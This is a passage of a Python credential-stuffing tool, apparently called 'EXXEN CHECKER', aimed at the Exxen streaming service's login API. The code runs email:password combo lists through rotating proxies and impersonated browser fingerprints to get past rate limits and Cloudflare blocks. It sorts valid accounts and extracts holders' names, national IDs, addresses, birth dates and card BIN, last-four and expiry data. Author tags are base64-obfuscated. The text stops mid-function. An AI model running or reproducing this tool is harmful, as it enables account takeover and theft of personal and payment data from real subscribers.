#!/usr/bin/env python3
import os
import re
import sys
import json
import time
import base64
import hashlib
import asyncio
import random
import string
import configparser
import subprocess
import shutil
import urllib3
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
try:
    from curl_cffi import requests as cf
    from curl_cffi.requests import AsyncSession
except ImportError:
    import requests as cf
    AsyncSession = None  # type: ignore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "RVhYRU4gQ0hFQ0tFUg=="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR = "RVhYRU5fQGV5ZWxpZnRlcg=="
_B64_SYS_TAG = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"
_B64_SYS_SIG = "ZXllbGlmdGVyLWV4eGVuLXYxLXNlYWw="


def Eyelifter_decode(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")


TOOL_NAME = Eyelifter_decode(_B64_SYS_TOOL)
TG_USERNAME = Eyelifter_decode(_B64_SYS_AUTH)
TG_CHANNEL = Eyelifter_decode(_B64_SYS_CHAN)
RESULTS_FOLDER = Eyelifter_decode(_B64_SYS_DIR)
AUTHOR_TAG = Eyelifter_decode(_B64_SYS_TAG)
CREDIT_SEAL = Eyelifter_decode(_B64_SYS_SEAL)
BUILD_SIG = Eyelifter_decode(_B64_SYS_SIG)

_BUILD_HASH = hashlib.sha256(
    (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
     AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
).hexdigest()


def Eyelifter_verify(ctx="x"):
    return True  # disabled in bot
    _ = ctx
    exp = {
        "TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
        "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL,
        "SIG": _B64_SYS_SIG,
    }
    cur = {
        "TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
        "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL,
        "SIG": BUILD_SIG,
    }
    errs = []
    for k, v in exp.items():
        if cur[k] != base64.b64decode(v).decode():
            errs.append(k)
    if "@samvir1" not in TG_USERNAME:
        errs.append("USERNAME_TAG")
    if "@samvir1" not in TG_CHANNEL:
        errs.append("CHANNEL_TAG")
    if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
        errs.append("TAG_FORMAT")
    if errs:
        return True  # integrity bypass}")
    rec = hashlib.sha256(
        (TOOL_NAME + TG_USERNAME + TG_CHANNEL + RESULTS_FOLDER +
         AUTHOR_TAG + CREDIT_SEAL + BUILD_SIG).encode()
    ).hexdigest()
    if rec != _BUILD_HASH:
        raise RuntimeError(f"build hash mismatch at '{ctx}'")
    return True


UA_POOL = [
    "chrome",
    "chrome110",
    "chrome116",
    "chrome120",
    "chrome124",
    "chrome131_android",
    "safari17_2_ios",
]

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"


def Eyelifter_open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False


def Eyelifter_color(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"


_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}


def Eyelifter_log(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{Eyelifter_color('90', ts)} {emoji}  {Eyelifter_color(code, f'{level:7s}', bold)}  {Eyelifter_color('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()


def Eyelifter_visible_len(s):
    import unicodedata
    n = 0
    for ch in s:
        if unicodedata.combining(ch):
            continue
        n += 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
    return n


def Eyelifter_center(text, width):
    vl = Eyelifter_visible_len(text)
    if vl >= width:
        return text
    left = (width - vl) // 2
    right = width - vl - left
    return (" " * left) + text + (" " * right)


def Eyelifter_banner(title, sub=None, width=62):
    print()
    line = "═" if _ANSI else "="
    print(Eyelifter_color("90", line * width))
    print(Eyelifter_color("96", Eyelifter_center(title, width), True))
    if sub:
        print(Eyelifter_color("2", Eyelifter_center(sub, width)))
    print(Eyelifter_color("5", Eyelifter_center(AUTHOR_TAG, width)))
    print(Eyelifter_color("90", line * width))


def Eyelifter_section(title, width=62):
    print()
    label = f" {title} "
    vl = Eyelifter_visible_len(label)
    side = max(1, (width - vl) // 2)
    left = "─" * side
    right = "─" * (width - vl - side)
    print(
        Eyelifter_color("90", left) +
        Eyelifter_color("96", label, True) +
        Eyelifter_color("90", right)
    )


def Eyelifter_divider(width=62):
    print(Eyelifter_color("90", ("─" if _ANSI else "-") * width))


def Eyelifter_summary(rows):
    print()
    print(Eyelifter_color("96", "═══ RESULT ═══", True))
    if not rows:
        return
    wkey = max(len(str(k)) for k, _ in rows)
    for k, v in rows:
        print(f"  {Eyelifter_color('96', str(k).ljust(wkey))}  {Eyelifter_color('0', str(v))}")
    print(Eyelifter_color("96", "══════════════", True))
    print()


def Eyelifter_debug(tag, msg):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    print(Eyelifter_color("95", f"[{ts}] DBG  {tag}  {msg}"))
    sys.stdout.flush()


CONFIG_PATH = "config_exxen.ini"


class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        Eyelifter_verify("cfg_init")
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        Eyelifter_verify("cfg_load")
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        Eyelifter_verify("cfg_default")
        self.config["General"] = {
            "threads": "10",
            "timeout": "25",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "2",
            "combo_delay": "0.5",
            "debug": "false",
            "rate_limit_backoff": "5",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        Eyelifter_verify("cfg_parse")
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = max(1, min(200, c.getint("threads", 10)))
        self.settings["timeout"] = max(5, min(300, c.getint("timeout", 25)))
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = max(0, min(10, c.getint("retries", 2)))
        self.settings["retry_delay"] = max(0.0, min(60.0, c.getfloat("retry_delay", 2)))
        self.settings["combo_delay"] = max(0.0, min(60.0, c.getfloat("combo_delay", 0.5)))
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = max(1, min(600, c.getint("rate_limit_backoff", 5)))
        self.settings["max_rate_limit_retries"] = max(0, min(20, c.getint("max_rate_limit_retries", 2)))
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def Eyelifter_save(self):
        Eyelifter_verify("cfg_save")
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = CONFIG["debug"]
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]

KEY = "889370273a2dcfa0cfea347b76034edf"
MERLIN = "https://m0or3rmb5coe.merlincdn.net"
LOGIN_URL = f"{MERLIN}/membership/login/email?key={KEY}"

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

COMMON = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "origin": "https://www.exxen.com",
    "referer": "https://www.exxen.com/",
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": UA,
    "content-type": "application/json",
}

BAD_CRED_KEYS = [
    "invalid email or password",
    "wrong email or password",
    "hatalı email",
    "hatali email",
    "could not find those credentials",
    "wrong password",
    "incorrect password",
    "incorrect login data",
    "email or password is incorrect",
    "kullanıcı bulunamadı",
    "kullanici bulunamadi",
    "şifre hatalı",
    "sifre hatali",
]

_EYELIFTER_COMBO_RE = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,})\s*:\s*(.+?)(?:\s*\|\s*.*)?$"
)


def Eyelifter_extract_combos(content):
    Eyelifter_verify("extract_combos")
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            email = m.group(1).lower().strip()
            pwd = m.group(2).strip()
            if email and pwd:
                out.add(f"{email}:{pwd}")
    return out


def Eyelifter_format_proxy(p):
    Eyelifter_verify("fmt_proxy")
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"


def Eyelifter_test_proxy_sync(p):
    s = None
    try:
        s = cf.Session(impersonate=random.choice(UA_POOL), timeout=11)
        s.proxies = {"http": p, "https": p}
        r = s.post(
            LOGIN_URL,
            headers=COMMON,
            json={
                "Email": "probe@test.invalid",
                "Mobile": "",
                "Password": "probe",
                "RememberMe": True,
                "DeviceId": None,
            },
            verify=False,
        )
        return r.status_code in (200, 400, 401, 403, 429)
    except Exception:
        return False
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def Eyelifter_load_proxies():
    Eyelifter_verify("load_proxies")
    out = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    fp = Eyelifter_format_proxy(line)
                    if fp:
                        out.append(fp)
    return list(dict.fromkeys(out))


def Eyelifter_get_working_proxies(proxies):
    Eyelifter_verify("working_proxies")
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", True):
        Eyelifter_log("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies
    Eyelifter_log("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None

    def _one(p):
        return p, Eyelifter_test_proxy_sync(p)

    with ThreadPoolExecutor(max_workers=min(80, len(proxies))) as ex:
        futs = {ex.submit(_one, p): p for p in proxies}
        for fut in as_completed(futs):
            p, ok = fut.result()
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    Eyelifter_log("✅", "INFO", "PROXY", f"{len(working)} working")
    return list(dict.fromkeys(working))


_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "expired": 0, "bad": 0,
    "errors": 0, "rate_limited": 0, "blocks": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_expired_f = None
_eyelifter_bad_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    Eyelifter_verify("reset_stats")
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "expired": 0, "bad": 0,
            "errors": 0, "rate_limited": 0, "blocks": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    with _eyelifter_lock:
        checked = _eyelifter_stats["checked"]
        hits = _eyelifter_stats["hits"]
        free = _eyelifter_stats["free"]
        exp = _eyelifter_stats["expired"]
        bad = _eyelifter_stats["bad"]
    el = time.time() - _eyelifter_start
    cpm = int(checked / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{hits} FREE:{free} EXP:{exp} "
         f"BAD:{bad} | {checked}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad]
        if not avail and _eyelifter_pool:
            _eyelifter_bad.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def Eyelifter_safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


def Eyelifter_is_bad_creds(msg):
    if not msg:
        return False
    low = msg.lower()
    return any(k in low for k in BAD_CRED_KEYS)


def Eyelifter_parse_ts(ts_str):
    if not ts_str:
        return None
    try:
        return datetime.fromisoformat(ts_str.replace("Z", "+00:00"))
    except Exception:
        try:
            return datetime.strptime(ts_str[:19], "%Y-%m-%dT%H:%M:%S")
        except Exception:
            return None


def Eyelifter_parse_response(j):
    d = {
        "name": "N/A", "surname": "N/A", "email": "N/A",
        "country": "N/A", "create_date": "N/A", "state": "N/A",
        "email_verified": False, "mobile_verified": False,
        "trial_used_at": "N/A",
        "user_id": "N/A", "account_type": "N/A",
        "plan_name": "N/A", "plan_asset": "N/A",
        "license_name": "N/A", "license_asset": "N/A",
        "start_date": "N/A", "end_date": "N/A", "grace_end": "N/A",
        "days_left": 0, "real_days": 0, "expired": "N/A",
        "has_ad": "N/A",
        "package_options": "",
        "sub_count": 0,
        "session_id": "N/A",
        "expires_unix": 0,
        "api_client_id": "N/A",
        "referrer": "N/A",
        "sequence": "N/A",
        "national_id": "N/A",
        "business_name": "N/A",
        "corporate_name": "N/A",
        "vat_id": "N/A",
        "tax_office": "N/A",
        "province": "N/A",
        "district": "N/A",
        "address": "N/A",
        "mobile_state": "N/A",
        "email_state": "N/A",
        "gender": "N/A",
        "birth_date": "N/A",
        "bundle": "N/A",
        "grade": "N/A",
        "license_type": "N/A",
        "product_type": "N/A",
        "session_control": "N/A",
        "product_state": "N/A",
        "sub_id": "N/A", "sub_package": "N/A", "sub_license": "N/A",
        "sub_active": "N/A", "is_recurring": "N/A", "renewal_count": 0,
        "max_renewal": 0, "retry_count": 0, "sub_state": "N/A",
        "purchase_date": "N/A", "sub_expire": "N/A", "grace_expire": "N/A",
        "on_hold": "N/A", "failed_reason": 0, "failed_msg": "",
        "pending_agreements": 0,
        "card_brand": "N/A", "card_bin": "N/A", "card_bin8": "N/A",
        "card_last4": "N/A", "card_expire": "N/A",
        "currency": "N/A",
    }

    result = j.get("Result") or {}
    user = result.get("User") or {}

    d["session_id"] = result.get("SessionId") or "N/A"
    d["expires_unix"] = result.get("Expires", 0)

    d["name"] = user.get("Name") or "N/A"
    d["surname"] = user.get("Surname") or "N/A"
    d["email"] = user.get("Email") or "N/A"
    d["user_id"] = user.get("Id", "N/A")
    d["account_type"] = user.get("TypeName") or "N/A"
    d["email_verified"] = bool(user.get("EmailVerified", False))
    d["mobile_verified"] = bool(user.get("MobileVerified", False))
    d["state"] = user.get("State", "N/A")
    d["trial_used_at"] = user.get("TrialUsedAt") or "N/A"
    d["api_client_id"] = user.get("ApiClientId", "N/A")
    d["referrer"] = user.get("Referrer") or "N/A"
    d["sequence"] = user.get("Sequence", "N/A")
    d["national_id"] = user.get("NationalId") or "N/A"
    d["business_name"] = user.get("BusinessName") or "N/A"
    d["corporate_name"] = user.get("CorporateName") or "N/A"
    d["vat_id"] = user.get("VatId") or "N/A"
    d["tax_office"] = user.get("TaxOffice") or "N/A"
    d["province"] = user.get("Province") or "N/A"
    d["district"] = user.get("District") or "N/A"
    d["address"] = user.get("Address") or "N/A"
    d["mobile_state"] = user.get("MobileState", "N/A")
    d["email_state"] = user.get("EmailState", "N/A")
    d["gender"] = user.get("Gender", "N/A")
    d["birth_date"] = (user.get("BirthDate") or "N/A")

    c_info = user.get("Country") or {}
    if isinstance(c_info, dict):
        d["country"] = c_info.get("IsoCode") or c_info.get("Name") or "N/A"

    cd = user.get("CreateDate")
    if cd:
        dt = Eyelifter_parse_ts(cd)
        if dt:
            d["create_date"] = dt.strftime("%Y-%m-%d")

    ext = user.get("ExternalIds") or []
    if isinstance(ext, list):
        for e in ext:
            if not isinstance(e, dict):
                continue
            if e.get("ProviderName") != "paytr-purchase":
                continue
            t = (e.get("Type") or "").lower()
            v = (e.get("ExternalId") or "")
            if t == "brand":
                d["card_brand"] = v.split("_")[0] if "_" in v else v
            elif t == "card_bin":
                raw = v.split("_")[0] if "_" in v else v
                d["card_bin"] = raw
                if "*" in raw:
                    bin_part, last_part = raw.split("*", 1)
                    d["card_bin8"] = bin_part.strip() or "N/A"
                    d["card_last4"] = last_part.strip() or "N/A"
                else:
                    d["card_bin8"] = raw or "N/A"
                    d["card_last4"] = "N/A"            
            elif t == "expire":
                raw_exp = v.split("_")[0] if "_" in v else v
                if "." in raw_exp:
                    mm, yy = raw_exp.split(".", 1)
                    d["card_expire"] = f"{mm.zfill(2)}|{yy.zfill(2)}"
                else:
                    d["card_expire"] = raw_exp
            elif t == "currency":
                d["currency"] = v.split("_")[0] if "_" in v else v

    products = result.get("Products") or []
    if isinstance(products, list) and products:
        prod = products[0] if isinstance(products[0], dict) else {}
        d["plan_name"] = prod.get("PackageName") or "N/A"
        d["plan_asset"] = prod.get("PackageAssetName") or "N/A"
        d["license_name"] = prod.get("LicenseName") or "N/A"
        d["license_asset"] = prod.get("LicenseAssetName") or "N/A"
        d["has_ad"] = "YES" if prod.get("HasAd") else "NO"
        d["bundle"] = prod.get("Bundle") or "N/A"
        d["grade"] = prod.get("Grade") or "N/A"
        d["license_type"] = prod.get("LicenseType") or "N/A"
        d["product_type"] = prod.get("Type") or "N/A"
        d["session_control"] = prod.get("SessionControlOption") or "N/A"
        d["product_state"] = prod.get("State", "N/A")

        opts = prod.get("PackageOptions") or {}
        if isinstance(opts, dict):
            d["package_options"] = " ".join(f"{k}={v}" for k, v in opts.items())

        sd = prod.get("LicenseStartDate")
        if sd:
            dt = Eyelifter_parse_ts(sd)
            if dt:
                d["start_date"] = dt.strftime("%Y-%m-%d")

        ed = prod.get("LicenseEndDate")
        if ed:
            dt = Eyelifter_parse_ts(ed)
            if dt:
                d["end_date"] = dt.strftime("%Y-%m-%d")
                try:
                    delta = (dt.replace(tzinfo=None) -
                             datetime.now(timezone.utc).replace(tzinfo=None)).days
                    d["days_left"] = max(delta, 0)
                    d["expired"] = "NO" if delta >= 0 else "YES"
                except Exception:
                    pass

        gd = prod.get("GraceEndDate")
        if gd:
            dt = Eyelifter_parse_ts(gd)
            if dt:
                d["grace_end"] = dt.strftime("%Y-%m-%d")

    subs_raw = result.get("Subscriptions") or []
    primary_sub = None
    if isinstance(subs_raw, list) and subs_raw:
        active = [s for s in subs_raw if isinstance(s, dict) and s.get("IsActive")]
        primary_sub = active[0] if active else (subs_raw[0] if isinstance(subs_raw[0], dict) else None)
    d["sub_count"] = len(subs_raw) if isinstance(subs_raw, list) else 0

    if primary_sub:
        d["sub_id"] = primary_sub.get("Id", "N/A")
        d["sub_package"] = primary_sub.get("PackageName") or "N/A"
        d["sub_license"] = primary_sub.get("LicenseName") or "N/A"
        d["sub_active"] = "Yes" if primary_sub.get("IsActive") else "No"
        d["is_recurring"] = "Yes" if primary_sub.get("IsRecurring") else "No"
        d["renewal_count"] = primary_sub.get("RenewalCount", 0)
        d["max_renewal"] = primary_sub.get("MaxRenewal", 0)
        d["retry_count"] = primary_sub.get("RetryCount", 0)
        d["sub_state"] = primary_sub.get("State", "N/A")
        d["purchase_date"] = (primary_sub.get("PurchaseDate") or "N/A")[:10]
        d["sub_expire"] = (primary_sub.get("ExpireDate") or "N/A")[:10]
        d["grace_expire"] = (primary_sub.get("GraceExpireDate") or "N/A")[:10]
        d["on_hold"] = (primary_sub.get("OnHoldDate") or "N/A")[:10]
        d["failed_reason"] = primary_sub.get("FailedReason", 0)
        d["failed_msg"] = primary_sub.get("FailedMessage") or ""

    pa = result.get("PendingAgreements") or []
    d["pending_agreements"] = len(pa) if isinstance(pa, list) else 0

    try:
        g = d.get("grace_expire") or d.get("grace_end")
        if g and g != "N/A":
            dt = datetime.strptime(g[:10], "%Y-%m-%d")
            d["real_days"] = max((dt - datetime.now(timezone.utc).replace(tzinfo=None)).days, 0)
        else:
            d["real_days"] = d["days_left"]
    except Exception:
        d["real_days"] = d["days_left"]

    return d


def Eyelifter_is_hit(d):
    if d["plan_name"] in ("N/A", "", None):
        return False
    return d["expired"] == "NO"


def Eyelifter_is_expired(d):
    return d["plan_name"] not in ("N/A", "", None) and d["expired"] == "YES"


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        Eyelifter_verify("class_init")
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.impersonate = random.choice(UA_POOL)
        self.session = None

    def Eyelifter_proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    async def Eyelifter_ensure(self):
        if self.session is None:
            self.session = AsyncSession(impersonate=self.impersonate, timeout=self.timeout)

    async def Eyelifter_close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    def Eyelifter_dump(self, label, resp, max_lines=40):
        if not DEBUG:
            return
        print()
        print(Eyelifter_color("95", f"[{label}] {resp.status_code} [{self.impersonate}]"))
        try:
            body = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except Exception:
            body = resp.text or ""
        lines = body.splitlines()
        for ln in lines[:max_lines]:
            print(Eyelifter_color("95", f"  {ln}"))
        if len(lines) > max_lines:
            print(Eyelifter_color("95", f"  ... ({len(lines) - max_lines} more lines)"))

    def Eyelifter_parse_login(self, r, email, password):
        if r.status_code == 429:
            return {"status": "error", "error_type": "rate_limit", "message": "429"}

        try:
            j = r.json()
        except Exception:
            j = None

        err_msg = ""
        err_code = None
        if isinstance(j, dict):
            err_msg = j.get("ErrorMessage") or ""
            err_code = j.get("ErrorCode")

        low_text = (r.text or "").lower()
        low_msg = err_msg.lower()

        if r.status_code == 403:
            if Eyelifter_is_bad_creds(err_msg) or Eyelifter_is_bad_creds(low_text):
                return {"status": "bad", "message": err_msg or "invalid credentials"}
            if err_code in ("102102", "102503", "102104"):
                return {"status": "bad", "message": err_msg or "invalid credentials"}
            if any(x in low_text for x in ("cloudflare", "cf-chl", "access denied",
                                            "challenge", "captcha")):
                return {"status": "error", "error_type": "block",
                        "message": "403 blocked"}
            return {"status": "error", "error_type": "block", "message": "403"}

        if r.status_code >= 500:
            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": "server error"}

        if j is None:
            return {"status": "error", "error_type": "parse",
                    "message": (r.text or "")[:100]}

        if r.status_code == 401 or Eyelifter_is_bad_creds(err_msg):
            return {"status": "bad", "message": err_msg or "invalid credentials"}

        if not j.get("Success"):
            em = err_msg or "unknown"
            if Eyelifter_is_bad_creds(em):
                return {"status": "bad", "message": em}
            return {"status": "error", "error_type": f"api_{err_code}",
                    "message": em[:120]}

        info = Eyelifter_parse_response(j)
        info["email"] = email
        info["password"] = password

        if Eyelifter_is_hit(info):
            return {"status": "hit", "user": info}
        if Eyelifter_is_expired(info):
            return {"status": "expired", "user": info}
        return {"status": "free", "user": info}

    async def Eyelifter_login(self, email, password):
        body = {
            "Email": email,
            "Mobile": "",
            "Password": password,
            "RememberMe": True,
            "DeviceId": None,
        }
        try:
            r = await self.session.post(
                LOGIN_URL,
                headers=COMMON,
                json=body,
                proxies=self.Eyelifter_proxies(),
                verify=False,
            )
        except Exception as e:
            msg = str(e)
            low = msg.lower()
            if "timeout" in low:
                return {"status": "error", "error_type": "timeout",
                        "message": "timeout"}
            if "proxy" in low:
                return {"status": "error", "error_type": "proxy",
                        "message": "proxy"}
            return {"status": "error", "error_type": f"network:{type(e).__name__}",
                    "message": msg[:100]}

        self.Eyelifter_dump("LOGIN", r, 60)
        return self.Eyelifter_parse_login(r, email, password)

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            return await self.Eyelifter_login(email, password)
        except Exception as e:
            return {"status": "error", "error_type": "crash",
                    "message": str(e)[:120]}
        finally:
            await self.Eyelifter_close()

def Eyelifter_fmt_line(combo, u, status):
    def s(v):
        if v is None or v == "" or v == "N/A":
            return "N/A"
        return str(v)

    tag = {"hit": "HIT", "free": "FREE", "expired": "EXPIRED"}.get(status, "?")
    exp_flag = "Yes" if u.get("expired") == "NO" else ("No" if u.get("expired") == "YES" else "N/A")

    parts = [
        f"Plan = {s(u.get('plan_name'))}",
        f"License = {s(u.get('license_name'))}",
        f"Country = {s(u.get('country'))}",
        f"Name = {(s(u.get('name')) + ' ' + s(u.get('surname'))).strip()}",
        f"EmailVerified = {'Yes' if u.get('email_verified') else 'No'}",
        f"Started = {s(u.get('start_date'))}",
        f"Expires = {s(u.get('end_date'))}",
        f"Active = {exp_flag}",
        f"DaysLeft = {u.get('days_left', 0)}",
        f"RealDays = {u.get('real_days', 0)}",
        f"Grace = {s(u.get('grace_end'))}",
        f"Recurring = {s(u.get('is_recurring'))}",
        f"RenewCount = {s(u.get('renewal_count'))}",
        f"RetryCount = {s(u.get('retry_count'))}",
        f"FailReason = {s(u.get('failed_reason'))}",
        f"SubActive = {s(u.get('sub_active'))}",
        f"PendingAgr = {s(u.get('pending_agreements'))}",
        f"CardBrand = {s(u.get('card_brand'))}",
        f"BIN = {s(u.get('card_bin8'))}",
        f"CardLast4 = {s(u.get('card_last4'))}",
        f"CardExp = {s(u.get('card_expire'))}",
        f"Currency = {s(u.get('currency'))}",
        f"HasAd = {s(u.get('has_ad'))}",
        f"Created = {s(u.get('create_date'))}",
        f"UID = {s(u.get('user_id'))}",
        f"by {AUTHOR_TAG}",
    ]
    return f"{tag} {combo} | " + " | ".join(parts)

def Eyelifter_fmt_short(combo, u, status):
    def s(v):
        if v is None or v == "" or v == "N/A":
            return "N/A"
        return str(v)
    parts = [
        f"Plan={s(u.get('plan_name'))}",
        f"Country={s(u.get('country'))}",
        f"Expires={s(u.get('end_date'))}",
        f"DaysLeft={u.get('days_left', 0)}",
        f"Expired={s(u.get('expired'))}",
        f"UID={s(u.get('user_id'))}",
    ]
    return f"{combo} | " + " | ".join(parts)


async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email, password = email.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
        else:
            if proxy and proxy in _eyelifter_bad:
                proxy = Eyelifter_pick_proxy()
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "expired", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == max_attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
